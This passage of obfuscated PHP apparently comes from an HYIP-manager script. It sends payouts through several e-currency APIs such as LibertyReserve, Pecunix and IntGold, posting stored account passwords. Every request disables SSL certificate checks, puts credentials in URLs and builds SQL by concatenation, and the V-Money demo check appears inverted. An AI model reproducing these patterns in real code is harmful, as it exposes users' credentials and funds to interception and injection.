        curl_setopt( $elnlcFCfmJ, CURLOPT_POST, 1 );
        curl_setopt( $elnlcFCfmJ, CURLOPT_POSTFIELDS, "AccountID=".rawurlencode( $elnlccQgz[$elnlcNjKgR['elnlcWqcrm']] )."&PassPhrase=".rawurlencode( $elnlcROwx )."&Payee_Account=".rawurlencode( $elnlcwELo )."&Amount=".rawurlencode( $elnlcUnxH )."&PAY_IN=".rawurlencode( $elnlccQgz[$elnlcNjKgR['elnlcRVSOn']] )."&WORTH_OF=Gold&Memo={$elnlclHqeS}&IGNORE_RATE_CHANGE=y" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcFCfmJ );
        curl_close( $elnlcFCfmJ );
        $elnlcLHQPA = array( );
        if ( preg_match( "/<input type=hidden name=PAYMENT_BATCH_NUM VALUE=\"(\\d+)\">/ims", $a, $elnlcLHQPA ) )
        {
            return array( 1, "", $elnlcLHQPA[1] );
        }
        else
        {
            if ( preg_match( "/<input type=hidden name=ERROR VALUE=\"(.*?)\">/ims", $a, $elnlcLHQPA ) )
            {
                $elnlcxrvsE = preg_replace( "/&lt;/i", "<", $elnlcLHQPA[1] );
                $elnlcxrvsE = preg_replace( "/&gt;/i", ">", $elnlcxrvsE );
                $e = elnlccplb( "{$elnlcszUr} {$elnlcxrvsE}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcszUr." {$elnlcxrvsE}", "" );
            }
            else
            {
                $e = elnlccplb( "{$elnlcszUr} Unknown error" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcszUr." Unknown error", "" );
            }
        }
    }
    else
    {
        $e = elnlccplb( "{$elnlcszUr} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcszUr." Curl functions are not available" );
    }
}

function elnlcxtdo( $elnlcUfUR, $elnlcUnxH, $elnlcwELo, $elnlclHqeS, $elnlcszUr )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTUnQ']] == $elnlcNjKgR['elnlcunJPe'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTOOda']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcwELo == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to AlertPay account 0.'";
        mysql_query( $q );
        return array( 0, "Invalid AlertPay account", "" );
    }
    $elnlcJqKVD = elnlcdljj( $elnlcwELo, 11 )[1];
    $elnlcCTPu = elnlcdljj( $elnlcwELo, 11 )[0];
    if ( $elnlcCTPu == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlcJqKVD}'";
        mysql_query( $q );
        return array( 0, $elnlcJqKVD );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcUfUR == "" )
        {
            $q = "select v from hm2_pay_settings where n='alertpay_account_password'";
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcLBJNI = elnlcbtvch( $elnlcELue[$elnlcNjKgR['elnlcAhNxE']], $elnlcNjKgR['elnlcfynR'] );
            }
        }
        else
        {
            $elnlcLBJNI = $elnlcUfUR;
        }
        $elnlcFCfmJ = curl_init( );
        $elnlclHqeS = rawurlencode( $elnlclHqeS );
        $elnlclpQg = sprintf( "USER=%s&PASSWORD=%s&AMOUNT=%s&CURRENCY=%s&RECEIVEREMAIL=%s&SENDEREMAIL=%s&PURCHASETYPE=%s&NOTE=%s&TESTMODE=%s", urlencode( $elnlccQgz[$elnlcNjKgR['elnlcszvx']] ), urlencode( $elnlcLBJNI ), urlencode( $elnlcUnxH ), "USD", urlencode( $elnlcwELo ), "", 0, urlencode( $elnlclHqeS ), 0 );
        curl_setopt( $elnlcFCfmJ, CURLOPT_URL, $elnlcNjKgR['elnlcLDCD'] );
        curl_setopt( $elnlcFCfmJ, CURLOPT_POST, true );
        curl_setopt( $elnlcFCfmJ, CURLOPT_POSTFIELDS, $elnlclpQg );
        curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, true );
        curl_setopt( $elnlcFCfmJ, CURLOPT_HEADER, false );
        curl_setopt( $elnlcFCfmJ, CURLOPT_TIMEOUT, 30 );
        curl_setopt( $elnlcFCfmJ, CURLOPT_SSL_VERIFYPEER, false );
        $a = curl_exec( $elnlcFCfmJ );
        curl_close( $elnlcFCfmJ );
        parse_str( urldecode( $a ), $elnlckJmH );
        $elnlcLHQPA = array( );
        if ( $elnlckJmH[$elnlcNjKgR['elnlcSCWma']] == 100 )
        {
            return array( 1, "", $elnlckJmH[$elnlcNjKgR['elnlcnhGxf']] );
        }
        else
        {
            if ( 200 < $elnlckJmH[$elnlcNjKgR['elnlcSCWma']] )
            {
                $elnlcxrvsE = $elnlckJmH[$elnlcNjKgR['elnlcSCWma']].": ".$elnlckJmH[$elnlcNjKgR['elnlczOqf']];
                $e = elnlccplb( "{$elnlcszUr} {$elnlcxrvsE}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcszUr." {$elnlcxrvsE}", "" );
            }
            else
            {
                $e = elnlccplb( "{$elnlcszUr} Unknown error" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcszUr." Unknown error", "" );
            }
        }
    }
    else
    {
        $e = elnlccplb( "{$elnlcszUr} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcszUr." Curl functions are not available" );
    }
}

function elnlcfley( $elnlcUfUR, $elnlcUnxH, $elnlcwELo, $elnlclHqeS, $elnlcszUr )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    $elnlcUnxH = sprintf( "%0.2f", floor( $elnlcUnxH * 100 ) / 100 );
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTOOda']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcwELo == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can not process withdrawal to Evocash account 0.'";
        mysql_query( $q );
        return array( 0, "Invalid EvoCash account", "" );
    }
    list( $elnlcCTPu, $elnlcJqKVD ) = elnlcdljj( $elnlcwELo, 1 );
    if ( $elnlcCTPu == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlcJqKVD}'";
        mysql_query( $q );
        return array( 0, $elnlcJqKVD );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcUfUR == "" )
        {
            $q = "select v from hm2_pay_settings where n='evocash_account_password'";
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcNLlEg = elnlcbtvch( $elnlcELue[$elnlcNjKgR['elnlcAhNxE']], $elnlcNjKgR['elnlcfynR'] );
            }
            $q = "select v from hm2_pay_settings where n='evocash_transaction_code'";
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcmtRg = elnlcbtvch( $elnlcELue[$elnlcNjKgR['elnlcAhNxE']], $elnlcNjKgR['elnlcfynR'] );
            }
        }
        else
        {
            list( $elnlcNLlEg, $elnlcmtRg ) = preg_split( "/\\|/", $elnlcUfUR );
        }
        $elnlcFCfmJ = curl_init( );
        $elnlclHqeS = rawurlencode( $elnlclHqeS );
        curl_setopt( $elnlcFCfmJ, CURLOPT_URL, "https://www.evocash.com/evoswift/instantpayment.cfm?payingaccountid=".rawurlencode( $elnlccQgz[$elnlcNjKgR['elnlcJJfiT']] )."&username=".rawurlencode( $elnlccQgz[$elnlcNjKgR['elnlcGSizP']] )."&password=".rawurlencode( $elnlcNLlEg )."&transaction_code=".rawurlencode( $elnlcmtRg )."&amount=".rawurlencode( $elnlcUnxH )."&reference=&memo={$elnlclHqeS}&receivingaccountid=".rawurlencode( $elnlcwELo )."" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcFCfmJ );
        curl_close( $elnlcFCfmJ );
        $elnlcLHQPA = array( );
        if ( preg_match( "/<INPUT TYPE=\"Hidden\" NAME=\"PayingTransactionID\" VALUE=\"(.*?)\">/ims", $a, $elnlcLHQPA ) )
        {
            return array( 1, "", $elnlcLHQPA[1] );
        }
        else
        {
            if ( preg_match( "/<INPUT TYPE=\"Hidden\" NAME=\"Error\" VALUE=\"(.*?)\">/ims", $a, $elnlcLHQPA ) )
            {
                $elnlcxrvsE = $elnlcLHQPA[1];
                $e = elnlccplb( "{$elnlcszUr} {$elnlcxrvsE}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcszUr." {$elnlcxrvsE}", "" );
            }
            else
            {
                $e = elnlccplb( "{$elnlcszUr} Unknown error" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $elnlcszUr." Unknown error", "" );
            }
        }
    }
    else
    {
        $e = elnlccplb( "{$elnlcszUr} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcszUr." Curl functions are not available" );
    }
}

function elnlcmcfd( $elnlcUfUR, $elnlcUnxH, $elnlcwELo, $elnlclHqeS, $elnlcszUr )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTUnQ']] == $elnlcNjKgR['elnlcunJPe'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTOOda']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcwELo == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to IntGold account 0.'";
        mysql_query( $q );
        return array( 0, "Invalid IntGold account", "" );
    }
    $elnlcJqKVD = elnlcdljj( $elnlcwELo, 2 )[1];
    $elnlcCTPu = elnlcdljj( $elnlcwELo, 2 )[0];
    if ( $elnlcCTPu == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlcJqKVD}'";
        mysql_query( $q );
        return array( 0, $elnlcJqKVD );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcUfUR == "" )
        {
            $q = "select v from hm2_pay_settings where n='intgold_password'";
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcIfBA = elnlcbtvch( $elnlcELue[$elnlcNjKgR['elnlcAhNxE']], $elnlcNjKgR['elnlcfynR'] );
            }
        }
        else
        {
            $elnlcIfBA = $elnlcUfUR;
        }
        if ( $elnlcUfUR == "" )
        {
            $q = "select v from hm2_pay_settings where n='intgold_password'";
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcIfBA = elnlcbtvch( $elnlcELue[$elnlcNjKgR['elnlcAhNxE']], $elnlcNjKgR['elnlcfynR'] );
            }
            $q = "select v from hm2_pay_settings where n='intgold_transaction_code'";
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcdinv = elnlcbtvch( $elnlcELue[$elnlcNjKgR['elnlcAhNxE']], $elnlcNjKgR['elnlcfynR'] );
            }
        }
        else
        {
            $elnlcdinv = preg_split( "/\\|/", $elnlcUfUR )[1];
            $elnlcIfBA = preg_split( "/\\|/", $elnlcUfUR )[0];
        }
        $elnlcFCfmJ = curl_init( );
        $elnlclHqeS = rawurlencode( $elnlclHqeS );
        curl_setopt( $elnlcFCfmJ, CURLOPT_URL, "https://intgold.com/cgi-bin/autopay.cgi" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcFCfmJ, CURLOPT_POST, 1 );
        curl_setopt( $elnlcFCfmJ, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_POSTFIELDS, "ACCOUNTID=".rawurlencode( $elnlccQgz[$elnlcNjKgR['elnlcWBlwG']] )."&PASSWORD=".rawurlencode( $elnlcIfBA )."&SECPASSWORD=".rawurlencode( $elnlcdinv )."&RECEIVER=".rawurlencode( $elnlcwELo )."&AMOUNT=".rawurlencode( $elnlcUnxH )."&NOTE=".$elnlclHqeS );
        curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
        curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcFCfmJ );
        curl_close( $elnlcFCfmJ );
        $elnlcLHQPA = array( );
        if ( preg_match( "/Success\\s*TRANSACTION_ID:(.*?)$/ims", $a, $elnlcLHQPA ) )
        {
            return array( 1, "", $elnlcLHQPA[1] );
        }
        else
        {
            $e = elnlccplb( "{$elnlcszUr} {$a}" );
            $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
            mysql_query( $q );
            return array( 0, $elnlcszUr." {$a}", "" );
        }
    }
    else
    {
        $e = elnlccplb( "{$elnlcszUr} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcszUr." Curl functions are not available" );
    }
}

function elnlcjkwq( $elnlcUfUR, $elnlcUnxH, $elnlcwELo, $elnlclHqeS, $elnlcszUr )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTUnQ']] == $elnlcNjKgR['elnlcunJPe'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTOOda']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcwELo == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to eeeCureency account 0.'";
        mysql_query( $q );
        return array( 0, "Invalid eeeCurrency account", "" );
    }
    $elnlcJqKVD = elnlcdljj( $elnlcwELo, 8 )[1];
    $elnlcCTPu = elnlcdljj( $elnlcwELo, 8 )[0];
    if ( $elnlcCTPu == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlcJqKVD}'";
        mysql_query( $q );
        return array( 0, $elnlcJqKVD );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcUfUR == "" )
        {
            $q = "select v from hm2_pay_settings where n='eeecurrency_password'";
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcKTcRL = elnlcbtvch( $elnlcELue[$elnlcNjKgR['elnlcAhNxE']], $elnlcNjKgR['elnlcfynR'] );
            }
            $q = "select v from hm2_pay_settings where n='eeecurrency_transaction_code'";
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcLubCS = elnlcbtvch( $elnlcELue[$elnlcNjKgR['elnlcAhNxE']], $elnlcNjKgR['elnlcfynR'] );
            }
        }
        else
        {
            $elnlcLubCS = preg_split( "/\\|/", $elnlcUfUR )[1];
            $elnlcKTcRL = preg_split( "/\\|/", $elnlcUfUR )[0];
        }
        $elnlcFCfmJ = curl_init( );
        $elnlclHqeS = rawurlencode( $elnlclHqeS );
        curl_setopt( $elnlcFCfmJ, CURLOPT_URL, "https://eeecurrency.com/cgi-bin/autopay.cgi" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcFCfmJ, CURLOPT_POST, 1 );
        curl_setopt( $elnlcFCfmJ, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_POSTFIELDS, "ACCOUNTID=".rawurlencode( $elnlccQgz[$elnlcNjKgR['elnlcOsej']] )."&PASSWORD=".rawurlencode( $elnlcKTcRL )."&SECPASSWORD=".rawurlencode( $elnlcLubCS )."&RECEIVER=".rawurlencode( $elnlcwELo )."&AMOUNT=".rawurlencode( $elnlcUnxH )."&NOTE={$elnlclHqeS}" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcFCfmJ );
        curl_close( $elnlcFCfmJ );
        $elnlcLHQPA = array( );
        if ( preg_match( "/Success\\s*TRANSACTION_ID:(.*?)$/ims", $a, $elnlcLHQPA ) )
        {
            return array( 1, "", $elnlcLHQPA[1] );
        }
        else
        {
            $e = elnlccplb( "{$elnlcszUr} {$a}" );
            $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
            mysql_query( $q );
            return array( 0, $elnlcszUr." {$a}", "" );
        }
    }
    else
    {
        $e = elnlccplb( "{$elnlcszUr} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcszUr." Curl functions are not available" );
    }
}

function elnlcnjkb( $elnlcUfUR, $elnlcUnxH, $elnlcwELo, $elnlclHqeS, $elnlcszUr )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTUnQ']] == $elnlcNjKgR['elnlcunJPe'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTOOda']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcwELo == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to empty Pecunix account.'";
        mysql_query( $q );
        return array( 0, "Invalid Pecunix account", "" );
    }
    $elnlcJqKVD = elnlcdljj( $elnlcwELo, 9 )[1];
    $elnlcCTPu = elnlcdljj( $elnlcwELo, 9 )[0];
    if ( $elnlcCTPu == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlcJqKVD}'";
        mysql_query( $q );
        return array( 0, $elnlcJqKVD );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcUfUR == "" )
        {
            $q = "select v from hm2_pay_settings where n='pecunix_password'";
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcuMBD = elnlcbtvch( $elnlcELue[$elnlcNjKgR['elnlcAhNxE']], $elnlcNjKgR['elnlcfynR'] );
            }
        }
        else
        {
            $elnlcuMBD = $elnlcUfUR;
        }
        $elnlcFCfmJ = curl_init( );
        $elnlclqWaS = elnlcbgmwb( "{px_time}" );
        $elnlcmoBkn = strtoupper( md5( $elnlcuMBD.":".$elnlclqWaS ) );
        $elnlclpQg = "\r\n    <TransferRequest>\r\n      <Transfer>\r\n        <TransferId> </TransferId>\r\n        <Payer> ".htmlentities( $elnlccQgz[$elnlcNjKgR['elnlcKcgw']], ENT_NOQUOTES )." </Payer>\r\n        <Payee> ".htmlentities( $elnlcwELo, ENT_NOQUOTES )." </Payee>\r\n        <CurrencyId> GAU </CurrencyId>\r\n        <Equivalent>\r\n          <CurrencyId> USD </CurrencyId>\r\n          <Amount> ".htmlentities( $elnlcUnxH, ENT_NOQUOTES )." </Amount>\r\n        </Equivalent>\r\n        <FeePaidBy> Payee </FeePaidBy>\r\n        <Memo> ".htmlentities( $elnlclHqeS, ENT_NOQUOTES )." </Memo>\r\n      </Transfer>\r\n      <Auth>\r\n        <Token> {$elnlcmoBkn} </Token>\r\n      </Auth>\r\n    </TransferRequest>\r\n    ";
        $elnlcFCfmJ = curl_init( );
        curl_setopt( $elnlcFCfmJ, CURLOPT_URL, "https://pxi.pecunix.com/money.refined...transfer" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_POST, 1 );
        curl_setopt( $elnlcFCfmJ, CURLOPT_POSTFIELDS, $elnlclpQg );
        curl_setopt( $elnlcFCfmJ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
        $a = curl_exec( $elnlcFCfmJ );
        curl_close( $elnlcFCfmJ );
        $elnlcMCLM = elnlceuje( $a );
        if ( $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] == $elnlcNjKgR['elnlcqjpcv'] )
        {
            return array( 1, "", $elnlcMCLM[$elnlcNjKgR['elnlcgIiR']] );
        }
        else
        {
            if ( $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] == $elnlcNjKgR['elnlcrGtTo'] )
            {
                $e = elnlccplb( "{$elnlcszUr} ".$elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']]." ".$elnlcMCLM[$elnlcNjKgR['elnlcxcOPc']] );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
            else
            {
                $e = elnlccplb( "{$elnlcszUr} Parse error: {$a}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
        }
    }
    else
    {
        $e = elnlccplb( "{$elnlcszUr} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcszUr." Curl functions are not available" );
    }
}

function elnlcblhcn( $elnlcUfUR, $elnlcUnxH, $elnlcwELo, $elnlclHqeS, $elnlcszUr )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTUnQ']] == $elnlcNjKgR['elnlcunJPe'] )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTOOda']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcwELo == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to empty LibertyReserve account.'";
        mysql_query( $q );
        return array( 0, "Invalid LibertyReserve account", "" );
    }
    $elnlcJqKVD = elnlcdljj( $elnlcwELo, 15 )[1];
    $elnlcCTPu = elnlcdljj( $elnlcwELo, 15 )[0];
    if ( $elnlcCTPu == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlcJqKVD}'";
        mysql_query( $q );
        return array( 0, $elnlcJqKVD );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcUfUR == "" )
        {
            $q = "select v from hm2_pay_settings where n='libertyreserve_password'";
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcpsdbu = elnlcbtvch( $elnlcELue[$elnlcNjKgR['elnlcAhNxE']], $elnlcNjKgR['elnlcfynR'] );
            }
            $elnlcEjWa = $elnlccQgz[$elnlcNjKgR['elnlcxNoT']];
        }
        else
        {
            $elnlcEjWa = preg_split( "/\\|/", $elnlcUfUR )[1];
            $elnlcpsdbu = preg_split( "/\\|/", $elnlcUfUR )[0];
        }
        $elnlcFCfmJ = curl_init( );
        $elnlcmoBkn = strtoupper( elnlcbgmwb( $elnlcpsdbu.":{lr_time}" ) );
        $elnlclpQg = "<TransferRequest id=\"".rand( 1000000, 9999999 )."\">\r\n  <Auth>\r\n    <ApiName>".htmlspecialchars( $elnlcEjWa )."</ApiName>\r\n    <Token>{$elnlcmoBkn}</Token>\r\n  </Auth>\r\n  <Transfer>\r\n    <TransferType>transfer</TransferType>\r\n    <Payer>".htmlentities( $elnlccQgz[$elnlcNjKgR['elnlcwdMd']], ENT_NOQUOTES )."</Payer>\r\n    <Payee>".htmlentities( $elnlcwELo, ENT_NOQUOTES )."</Payee>\r\n    <CurrencyId>".htmlentities( $elnlccQgz[$elnlcNjKgR['elnlcGkHuC']] )."</CurrencyId>\r\n    <Amount>".htmlentities( $elnlcUnxH, ENT_NOQUOTES )."</Amount>\r\n    <Memo>".htmlentities( $elnlclHqeS, ENT_NOQUOTES )."</Memo>\r\n    <Anonymous>false</Anonymous>\r\n  </Transfer>\r\n</TransferRequest>";
        $elnlcFCfmJ = curl_init( );
        curl_setopt( $elnlcFCfmJ, CURLOPT_URL, "https://api.libertyreserve.com/xml/transfer.aspx?req=".urlencode( $elnlclpQg ) );
        curl_setopt( $elnlcFCfmJ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
        $elnlcPRLNi = array( "User-Agent: Mozilla/5.0" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_HTTPHEADER, $elnlcPRLNi );
        $a = curl_exec( $elnlcFCfmJ );
        curl_close( $elnlcFCfmJ );
        $elnlccQgz[$elnlcNjKgR['elnlcCduRv']] = $elnlclpQg;
        $elnlccQgz[$elnlcNjKgR['elnlcRFyD']] = $a;
        $elnlcMCLM = elnlcqcrrd( $a );
        if ( $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] == $elnlcNjKgR['elnlcqjpcv'] )
        {
            return array( 1, "", $elnlcMCLM[$elnlcNjKgR['elnlcgIiR']] );
        }
        else
        {
            if ( $elnlcMCLM[$elnlcNjKgR['elnlcjwsPE']] == $elnlcNjKgR['elnlcrGtTo'] )
            {
                $e = elnlccplb( "{$elnlcszUr} ".$elnlcMCLM[$elnlcNjKgR['elnlcAMcNx']]."<br>".$elnlcMCLM[$elnlcNjKgR['elnlcxcOPc']] );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
            else
            {
                $e = elnlccplb( "{$elnlcszUr} Parse error: {$a}" );
                $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
                mysql_query( $q );
                return array( 0, $e, "" );
            }
        }
    }
    else
    {
        $e = elnlccplb( "{$elnlcszUr} Curl functions are not available" );
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$e}'";
        mysql_query( $q );
        return array( 0, $elnlcszUr." Curl functions are not available" );
    }
}

function elnlccjns( $elnlcUfUR, $elnlcUnxH, $elnlcwELo, $elnlclHqeS, $elnlcszUr )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( !( $elnlccQgz[$elnlcNjKgR['elnlcTUnQ']] == $elnlcNjKgR['elnlcunJPe'] ) || $elnlccQgz[$elnlcNjKgR['elnlcTOOda']] == 1 )
    {
        return array( 1, "[transaction in demo mode]", "[transaction in demo mode]" );
    }
    if ( $elnlcwELo == "" )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = 'Can`t process withdrawal to empty V-Money account.'";
        mysql_query( $q );
        return array( 0, "Invalid V-Money account", "" );
    }
    $elnlcJqKVD = elnlcdljj( $elnlcwELo, 16 )[1];
    $elnlcCTPu = elnlcdljj( $elnlcwELo, 16 )[0];
    if ( $elnlcCTPu == 0 )
    {
        $q = "insert into hm2_pay_errors set date = now(), txt = '{$elnlcJqKVD}'";
        mysql_query( $q );
        return array( 0, $elnlcJqKVD );
    }
    if ( function_exists( "curl_init" ) )
    {
        if ( $elnlcUfUR == "" )
        {
            $q = "select v from hm2_pay_settings where n='vmoney_password'";
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcUakeO = elnlcbtvch( $elnlcELue[$elnlcNjKgR['elnlcAhNxE']], $elnlcNjKgR['elnlcfynR'] );
            }
        }
        else
        {
            $elnlcUakeO = $elnlcUfUR;
        }
        $elnlcmoBkn = md5( $elnlccQgz[$elnlcNjKgR['elnlcCviQ']].$elnlcUakeO.elnlcbgmwb( "{vm_time}" ) );
        $elnlclpQg = "<Request>\r\n\t<Type>Transfer</Type>\r\n\t<Auth>\r\n\t\t<AccountId>".htmlentities( $elnlccQgz[$elnlcNjKgR['elnlcCviQ']], ENT_NOQUOTES )."</AccountId>\r\n\t\t<Token>{$elnlcmoBkn}</Token>\r\n\t</Auth>\r\n\t<Transfers>\r\n\t\t<Transfer>\r\n\t\t\t<ID>1</ID>\r\n\t\t\t<Payee>".htmlentities( $elnlcwELo, ENT_NOQUOTES )."</Payee>\r\n\t\t\t<Amount>".htmlentities( $elnlcUnxH, ENT_NOQUOTES )."</Amount>\r\n\t\t\t<Memo>".htmlentities( $elnlclHqeS, ENT_NOQUOTES )."</Memo>\r\n\t\t</Transfer>\r\n\t</Transfers>\r\n        </Request>";
        $elnlcFCfmJ = curl_init( );
        curl_setopt( $elnlcFCfmJ, CURLOPT_URL, "https://www.v-money.net/vai.php" );
        curl_setopt( $elnlcFCfmJ, CURLOPT_POST, 1 );
        curl_setopt( $elnlcFCfmJ, CURLOPT_POSTFIELDS, "request_data=".$elnlclpQg );
        curl_setopt( $elnlcFCfmJ, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $elnlcFCfmJ, CURLOPT_RETURNTRANSFER, 1 );
